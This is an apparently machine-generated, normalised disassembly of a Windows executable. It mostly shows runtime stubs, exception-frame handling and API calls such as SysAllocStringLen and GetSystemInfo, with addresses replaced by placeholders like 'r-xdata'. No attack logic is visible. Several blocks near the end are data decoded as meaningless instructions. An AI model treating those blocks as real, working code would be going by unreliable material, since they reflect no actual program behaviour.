pop ebp
retn
sub_43f3d6
jmp sub_448b58
sub_43f3dd
pop ebx
pop ecx
pop ebp
retn
sub_43f422
jmp sub_448b58
sub_43f429
pop ebx
pop ecx
pop ebp
retn
sub_43f46e
jmp sub_448b58
sub_43f475
pop ebx
pop ecx
pop ebp
retn
sub_43f85f
jmp sub_448b58
sub_43f866
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_43f900
jmp sub_448b58
sub_43f907
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_43fdd5
jmp sub_4488a4
sub_43fe92
jmp sub_4488a4
sub_43ff3d
jmp sub_4488a4
sub_440035
jmp sub_4488a4
sub_44010e
jmp sub_4488a4
sub_4401fa
jmp sub_4488a4
sub_4403ba
jmp sub_448b58
sub_4403c1
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_440423
jmp sub_448b58
sub_44042a
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4408da
jmp sub_4488a4
sub_440a43
jmp sub_4488a4
sub_440b2a
jmp sub_448b58
sub_440b31
movzx eax [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_440bd0
jmp sub_448b58
sub_440bd7
movzx eax [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_440fc8
call sub_440c2c
neg al
sbb eax eax
neg eax
retn
sub_441089
jmp sub_448b58
sub_441090
fld [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_441139
jmp sub_448b58
sub_441140
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_441584
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_441194
fstp [ esp ]
fwait
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_441733
jmp sub_4488a4
sub_441840
jmp sub_448b58
sub_441847
fld [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_441951
jmp sub_448b58
sub_441958
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_441e3c
jmp sub_448b58
sub_441e43
fild [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_441f4d
jmp sub_448b58
sub_441f54
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_44252c
jmp sub_448b58
sub_442533
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4425c9
jmp sub_448b58
sub_4425d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4425ed
lea eax [ ebp - 0x14 ]
call j_sub_449348
retn
sub_4425e6
jmp sub_448b58
sub_4425ed
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44264a
jmp sub_448b58
sub_442651
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4426cd
jmp sub_448b58
sub_442d1e
jmp sub_448b58
sub_442d25
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442dc9
jmp sub_448b58
sub_442dd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442df2
lea eax [ ebp - 0x18 ]
mov edx 0x2
call j_sub_44936c
retn
sub_442deb
jmp sub_448b58
sub_442df2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442e4e
jmp sub_448b58
sub_442e55
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442f05
jmp sub_448b58
sub_442f27
jmp sub_448b58
sub_442f2e
movzx eax [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4434d5
jmp sub_448b58
sub_4434dc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44353a
jmp sub_448b58
sub_443541
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4435e3
jmp sub_448b58
sub_443600
jmp sub_448b58
sub_443607
movzx eax [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_443bb8
jmp sub_448b58
sub_443bbf
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443c32
jmp sub_448b58
sub_443c39
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443fdc
push eax
call sub_43ef08
pop eax
mov [ eax ] 0x5
fstp [ eax + 0x8 ]
fwait
retn
sub_443ff0
push eax
call sub_43ef08
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_444004
push eax
call sub_43ef08
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_4441c3
jmp sub_448b58
sub_4441ef
jmp sub_448b58
sub_4441f6
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444473
jmp sub_448b58
sub_44447a
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44473c
jmp sub_448b58
sub_4447cb
jmp sub_448b58
sub_4448bc
jmp sub_448b58
sub_44495f
jmp sub_448b58
sub_444a16
jmp sub_448b58
sub_444abc
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_43f250
add esp 0x10
sub_444e4b
jmp sub_448b58
sub_444e52
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444eec
movzx eax [ eax ]
retn
sub_444fec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43ef08
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_445004
mov edx 0x80020004
call sub_444fec
retn
sub_445054
mov dl 0x1
call sub_44505c
retn
sub_445109
jmp sub_448b58
sub_445114
push ebp
mov ebp esp
call sub_4452d4
pop ebp
retn 0x4
sub_4451a0
push ebp
mov ebp esp
call sub_4452d4
pop ebp
retn 0x4
sub_445283
jmp sub_448b58
sub_44528a
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4481a0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4486e4
sub_4452ac
xor eax eax
retn
sub_4452b0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
movzx eax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4452c4
mov [ ecx ] 0x8
mov al 0x1
retn
sub_4452cc
call sub_43e664
retn
sub_4452d4
call sub_43e754
retn
sub_4452dc
call sub_43ec04
retn
sub_4452e4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
movzx eax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4452f8
call sub_4452d4
retn
sub_445300
push ebp
mov ebp esp
call sub_4452dc
pop ebp
retn 0x8
sub_445318
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_4453f4
jmp sub_448b58
sub_4454ad
jmp sub_448b58
sub_4454b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4454d1
lea eax [ ebp - 0x10 ]
call j_sub_449348
retn
sub_4454ca
jmp sub_448b58
sub_4454d1
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4454dc
call sub_43ec58
retn
sub_4454e4
mov ecx 0xe
call sub_444a54
cmp al 0x1
retn
sub_445563
jmp sub_448b58
sub_44556a
pop ebp
retn
sub_44560d
jmp sub_448b58
sub_445614
pop ebp
retn
sub_44579b
add [ esp + 0x4 ] 0xfffffff8
jmp sub_44b9ac
sub_4457a5
add [ esp + 0x4 ] 0xfffffff8
jmp sub_44b9c0
sub_445848
mov edx 0x1
xchg edx eax
[ edx ] eax
inc eax
retn
sub_445854
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_4459dc
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] eax
retn
sub_4459f0
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ eax + 0xc ]
mov eax [ eax + 0x10 ]
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] eax
retn
sub_445c6a
retn
sub_447510
push esi
push edi
mov edi eax
mov esi rw-data
mov ecx 0x6
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_447524
push esi
push edi
mov esi eax
mov edi rw-data
mov ecx 0x6
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_447580
call sub_4015fc
cmp [ eax + 0x10 ] 0x0
je r-xdata
xor eax eax
retn
call sub_4015fc
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
retn
sub_4475a0
call sub_4015fc
cmp [ eax + 0x10 ] 0x0
je r-xdata
xor eax eax
retn
call sub_4015fc
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x4 ]
retn
sub_4475f4
call sub_4015fc
mov eax [ eax + 0x10 ]
retn
sub_447600
push eax
call sub_4015fc
mov edx [ eax + 0x10 ]
pop [ eax + 0x10 ]
mov eax edx
retn
sub_447618
mov [ rw-data ] edx
call sub_44927c
sub_44767c
push eax
push edx
push ecx
call sub_4015fc
cmp [ eax + 0x14 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_447670
retn
sub_447698
retn
sub_4476ac
push ebx
call sub_4015fc
mov ebx [ eax + 0x14 ]
call sub_4015fc
xor edx edx
mov [ eax + 0x14 ] edx
mov eax ebx
pop ebx
retn
sub_4478d9
jmp sub_448b58
sub_4478e0
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447948
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_447958
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_4479f4
mov edx [ eax + 0x1c ]
call sub_4479ac
retn
j_sub_447c6c
jmp sub_447c6c
sub_447c69
retn
sub_447ff1
jmp sub_448b58
sub_44806c
fninit
fwait
fldcw [ rw-data ]
retn
sub_448078
mov al 0x4
jmp sub_447670
sub_448080
mov al 0x5
jmp sub_447670
sub_44812d
jmp sub_448b58
sub_448134
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44813c
mov eax [ eax - 0x30 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_448148
push ebx
mov ebx eax
mov eax ebx
call sub_448178
call sub_44748c
mov edx eax
mov eax ebx
call sub_4481bc
pop ebx
retn
sub_448164
push ebx
mov ebx eax
mov eax ebx
call sub_448214
mov eax ebx
call sub_4474a8
pop ebx
retn
sub_448178
add eax 0xffffffcc
mov eax [ eax ]
retn
sub_4481a0
call sub_44873c
test dl dl
jle r-xdata
retn
call sub_4486e4
sub_448268
retn
sub_44826c
cmp eax edx
sete al
retn
sub_448274
retn
sub_4482fc
jmp sub_448b58
sub_448303
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_448428
jmp r-xdata
cmp eax edx
je r-xdata
mov al 0x1
retn
mov eax [ eax - 0x30 ]
test eax eax
jne r-xdata
mov eax [ eax ]
retn
sub_44843c
add eax 0xffffffb8
mov eax [ eax ]
retn
sub_448444
mov eax 0x8000ffff
retn
sub_44844c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx ]
call sub_448088
pop esi
pop ebx
retn
sub_448460
retn
sub_448464
retn
sub_448468
retn
sub_4485fa
retn
sub_4486bd
jmp sub_4488a4
sub_4486c2
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_448ca8
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_4486e4
sub_4486e4
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_44871b
jmp sub_4488a4
sub_44873c
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_44874c
call sub_448790
mov edx [ eax ]
test edx edx
je r-xdata
retn
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_448764
sub_448790
mov edx [ eax ]
add edx 0xffffffcc
mov edx [ edx ]
add edx eax
sub edx 0x4
mov eax edx
retn
sub_4487a0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_448868
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_448884
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_448bdd
call sub_4015fc
mov ecx [ eax + 0x10 ]
mov edx [ ecx ]
mov [ eax + 0x10 ] edx
mov eax [ ecx + 0x8 ]
jmp sub_4481b0
sub_448ca4
retn
sub_448d41
retn
sub_448ef5
jmp sub_4488a4
sub_448f58
jmp sub_448b58
sub_448f5f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448fa7
jmp sub_448b58
sub_448fae
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448fb4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44be28
pop esi
pop ebx
retn
sub_4490e9
retn
sub_449275
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44927c
mov [ rw-data ] eax
call sub_44917c
sub_449288
pop [ rw-data ]
jmp sub_44927c
sub_44932c
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
push ebx
call ExitThread
mov eax ebx
call [ rw-data ]
sub_4494c4
mov edx [ eax ]
movzx ecx [ rw-data ]
call sub_449f58
retn
sub_4494d4
mov edx [ eax ]
call sub_449f30
retn
sub_4494ec
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx edx
sub ecx 0xa
cmp [ ecx ] 0x2
je r-xdata
mov edx [ eax ]
call sub_4494dc
mov edx eax
sub_44950c
push ebx
mov ebx eax
mov eax ebx
call sub_449f58
mov eax [ ebx ]
pop ebx
retn
sub_4495bc
retn
sub_4495fc
retn
sub_449600
xchg [ esp ] ecx
push ecx
xor ecx ecx
mov cl [ edx ]
inc edx
jmp sub_449444
sub_44960e
retn
sub_449624
retn
sub_4497b8
retn
j_sub_4497bc
jmp sub_4497bc
sub_44987d
retn
sub_449880
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
sub_449890
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
j_sub_4498a8#2
jmp sub_4498a8
sub_449905
retn
j_sub_4498a8
jmp sub_4498a8
sub_44990d
retn
sub_4499b0
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_447670
sub_4499c8
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_449ad8
push ebx
mov ebx [ rw-data ]
push ebx
call sub_449a3c
pop ebx
retn
sub_449b38
retn
sub_449b74
retn
sub_449ba3
retn
sub_449ba4
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
j_sub_449be8
jmp sub_449be8
sub_449c71
retn
j_sub_449880
jmp sub_449880
sub_449d19
retn
sub_449d21
retn
sub_449d29
retn
sub_449e58
push ebx
mov ebx [ rw-data ]
push ebx
call sub_449dc4
pop ebx
retn
sub_449ed4
retn
sub_449f10
retn
sub_449f2c
retn
sub_449f57
retn
sub_449f7a
retn
sub_449f7c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_449e68
mov ecx [ edx - 0x4 ]
shr ecx 0x1
sub_449f8c
retn
sub_449f90
xor ecx ecx
test edx edx
je r-xdata
jmp sub_449ae8
mov ecx [ edx - 0x4 ]
cmp [ edx - 0xa ] 0x2
jne r-xdata
xchg [ esp ] ecx
push ecx
movzx ecx [ edx - 0xc ]
xchg [ esp + 0x4 ] ecx
jmp sub_449a3c
sub_449fb6
retn
sub_449fb8
xor ecx ecx
mov cl [ edx ]
inc edx
jmp sub_449e58
sub_449fc2
retn
sub_449fc4
test eax eax
je r-xdata
retn
sub eax 0x4
mov eax [ eax ]
sub_44a365
retn
sub_44a429
jmp sub_448b58
sub_44a430
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_44a5ca
jmp sub_448b58
sub_44a5d1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_44a5d8#2
jmp sub_44a5d8
sub_44a631
retn
sub_44a639
retn
sub_44a7d0
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_447670
call [ rw-data ]
retn
sub_44a8f8
mov ecx 0x1
jmp sub_44a7e8
sub_44a902
retn
sub_44a904
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_447670
call [ rw-data ]
retn
sub_44ab70
retn
sub_44ab74
push eax
call sub_44a8f8
pop eax
call sub_4474a8
retn
sub_44ab84
mov al 0x11
jmp sub_447670
sub_44abaf
retn
sub_44af12
jmp sub_448b58
sub_44af19
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44af38
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_44aa5c
pop ebp
retn 0x4
j_sub_44a7e8
jmp sub_44a7e8
sub_44af4d
retn
sub_44af50
call sub_44b0fc
retn
sub_44b160
test eax eax
je r-xdata
retn
[ eax - 0x8 ]
sub_44b194
call sub_44b16c
retn
sub_44b570
jmp sub_448b58
sub_44b768
call sub_44b778
retn
sub_44b770
call sub_44b798
retn
sub_44b778
push ebx
mov ebx eax
mov eax 0x8
call sub_44748c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_44b837
jmp sub_4488a4
sub_44b858
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_44b8cc
jmp sub_448b58
sub_44b8d3
pop ecx
pop ebp
retn
sub_44b94c
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_44b958
add eax 0x4
call sub_445854
retn
sub_44b964
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_447670
sub_44b974
call sub_448148
mov [ eax + 0x4 ] 0x1
retn
sub_44b9ac
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
call sub_445848
pop ebp
retn 0x4
sub_44bc0c
jmp sub_448b58
sub_44bc13
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44bc9c
jmp sub_448b58
sub_44bca3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44bd73
jmp sub_448b58
sub_44bd7a
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44be06
jmp sub_448b58
sub_44be0d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44be14
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44bd80
pop esi
pop ebx
retn
sub_44be94
add esp 0xffffffdc
push esp
call GetSystemInfo
mov eax [ esp + 0x14 ]
add esp 0x24
retn
sub_44bf42
jmp sub_448b58
sub_44bf49
pop ebp
retn
sub_44c056
inc esp
add al ch
retn 0x44
sub_44c073
jmp [ esi ]
sub_44c3ec
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_44c430
push ebx
mov ebx eax
mov eax ebx
call sub_44cfb4
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_44cfa6
jmp sub_448b58
sub_44cfb4
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_41e508
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_44c400
sub_44d061
jmp sub_448b58
sub_44d068
pop ebp
retn
sub_44d06c
sub [ rw-data ] 0x1
retn
sub_44d389
jmp sub_448b58
sub_44d390
pop ebp
retn
sub_44d394
sub [ rw-data ] 0x1
retn
sub_44d39c
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_4481b0
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_44d460
jmp sub_448b58
sub_44d467
pop ebp
retn
sub_44d46c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_44d3b8
call sub_44900c
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_447ae4
sub_44ec15
jmp sub_448b58
sub_44ec1c
pop ebp
retn
sub_44ecec
jmp sub_448b58
sub_44ecf3
pop ebp
retn
sub_44ecf8
sub [ rw-data ] 0x1
retn
sub_44ee61
jmp sub_448b58
sub_44ee68
pop ebp
retn
sub_44ee6c
sub [ rw-data ] 0x1
retn
sub_44f114
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_44f2f1
jmp sub_448b58
sub_44f2f8
pop ebx
pop ecx
pop ebp
retn
sub_44f304
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_44f568
sub_44f3b1
jmp sub_448b58
sub_44f3b8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_4481b0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_44f40c
cmp dl [ eax + 0x42 ]
je r-xdata
retn
mov [ eax + 0x42 ] dl
sub_44f600
jmp sub_448b58
sub_44f607
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f69e
jmp sub_448b58
sub_44f6a5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f6c2
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
sub_44f6bb
jmp sub_448b58
sub_44f6c2
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4483f8
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f77b
jmp sub_448b58
sub_44f782
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f788
or edx 0xffffffff
call sub_44f6fc
retn
sub_44fc07
jmp sub_448b58
sub_44fc0e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fc2b
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
sub_44fc24
jmp sub_448b58
sub_44fc2b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fc48
mov eax [ ebp - 0x4 ]
call sub_450758
retn
sub_44fc41
jmp sub_448b58
sub_44fc48
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44fd03
jmp sub_448b58
sub_44fd86
jmp sub_448b58
sub_44fe08
jmp sub_448b58
sub_44fe0f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44fe14
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_4483f8
sub_44fe2c
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_422fbc
pop ebx
retn
sub_44fed0
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_424590
sub_44ffe7
jmp sub_448b58
sub_44ffee
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4481b0
retn
sub_450004
jmp sub_448b58
sub_450322
jmp sub_448b58
sub_450329
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450346
mov eax [ ebp - 0x10 ]
call sub_4481b0
retn
sub_45033f
jmp sub_448b58
sub_450346
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450363
mov eax [ ebp - 0x8 ]
call sub_4481b0
retn
sub_45035c
jmp sub_448b58
sub_450363
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4503cc
jmp sub_448b58
sub_4504e6
jmp sub_448b58
sub_450503
jmp sub_448b58
sub_4506de
jmp sub_448b58
sub_4506e5
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_450754
inc [ eax + 0x5c ]
retn
sub_450758
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_4483f8
sub_4507ac
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_4507e9
jmp sub_448b58
sub_4507f0
pop ebp
retn
sub_4507f4
sub [ rw-data ] 0x1
retn
sub_4509c6
std
push eax
jmp [ eax + edx + 0x12d40045 ]
sub_450cfc
sbb al 0xeb
inc edx
add [ ebx + ebp * 8 + 0x42 ] bh
add [ eax - 0x15 ] dl
inc edx
add [ eax - 0x5fffbd15 ] al
0xeb340042 0x42
sub_450db0
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_424744
retn
sub_450dc8
mov al 0x1
retn
sub_450dcc
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_42e6d8
retn
mov eax edx
retn
sub_450ddc
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_42e6a8
retn
mov al 0x1
retn
sub_4510d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4246e8
pop esi
pop ebx
retn
sub_4510e8
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_451124
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_4513b8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_448388
pop ebx
retn
sub_4513cc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_448388
pop ebx
retn
sub_4513e0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_448388
pop ebx
retn
sub_4513f4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_448388
pop ebx
retn
sub_451408
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_448388
pop ebx
retn
sub_45141c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_448388
pop ebx
retn
sub_451430
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_448388
pop ebx
retn
sub_451444
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_448388
pop ebx
retn
sub_451458
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_448388
pop ebx
retn
sub_45146c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_448388
pop ebx
retn
sub_451480
retn
sub_451484
retn
sub_451488
retn
sub_45148c
retn
sub_451490
retn
sub_451494
retn
sub_451498
retn
sub_45149c
retn
sub_4514a0
retn
sub_4514a4
retn
sub_4514a8
retn
sub_4514ac
retn
sub_451820
jmp sub_448b58
sub_451c74
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov [ ebx + 0x90 ] eax
sub_451cf4
push esi
mov si 0xffef
call sub_4483f8
pop esi
retn
sub_451d95
jmp sub_448b58
sub_451d9c
pop ebp
retn
sub_451da0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_423d80
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_423d80
sub_451e08
jmp sub_448b58
sub_451e0f
pop ebp
retn
sub_451e99
jmp sub_448b58
sub_451ea0
pop ebp
retn
sub_451ea4
sub [ rw-data ] 0x1
retn
sub_454fce
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add al bl
cmp ecx [ ecx ]
dec eax
add [ eax + eax + 0x64 ] 0x8c004481

sub_4551e2
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add al bl
cmp ecx [ ecx ]
dec eax
add [ eax + eax + 0x64 ] 0x8c004481

sub_455cf8
sbb al 0xeb
inc edx
add [ ebx + ecx * 8 ] ch
dec eax
add [ eax - 0x15 ] dl
inc edx
add ah ah

sub_455d5e
dec eax
add [ esp + edx + 0x14a80045 ] ah
inc ebp
add ah al

sub_455d6a
dec eax
